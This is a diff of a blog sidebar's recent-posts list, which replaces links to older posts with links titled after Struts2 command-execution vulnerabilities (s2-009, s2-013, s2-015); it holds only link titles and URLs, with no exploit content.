-            <a href="/2025/01/13/CVE-2016-4437/">CVE-2016-4437</a>
+            <a href="/2025/01/28/s2-015%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">s2-015命令执行</a>
           </li>
         
           <li>
-            <a href="/2025/01/11/Sec-Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/">Sec-Linux常用命令</a>
+            <a href="/2025/01/28/s2-013%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">s2-013命令执行</a>
           </li>
         
           <li>
-            <a href="/2025/01/10/week9_kls_exam/">week9_kls_exam</a>
+            <a href="/2025/01/26/s2-009%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">s2-009命令执行</a>
           </li>
         
       </ul>
